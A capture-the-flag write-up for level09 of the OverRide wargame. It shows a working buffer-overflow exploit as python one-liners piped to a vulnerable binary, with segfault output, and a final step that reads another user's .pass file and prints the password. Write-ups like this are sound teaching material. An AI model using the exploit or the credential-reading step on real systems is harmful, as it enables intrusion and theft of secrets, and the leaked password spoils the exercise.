# level09
In this level, we have a binary that will wait for two inputs, a username and a message

```bash
level09@OverRide:~$ (python -c "print('a' * 40  + '\xc8\n')") | ./level09 
```

```bash
level09@OverRide:~$ (python -c "print('a' * 40  + '\xca\n')") | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
level09@OverRide:~$ 
```

Every value higher than `\xc8` after the 40th character will produce a segfault,
so we can assume that the buffer is 200 character long

See the [gdb writeup](gdbwriteup.md) to understand what is the address that we will send after the segfault

```bash
level09@OverRide:~$ (python -c "print('a' * 40  + '\xca\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])"; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
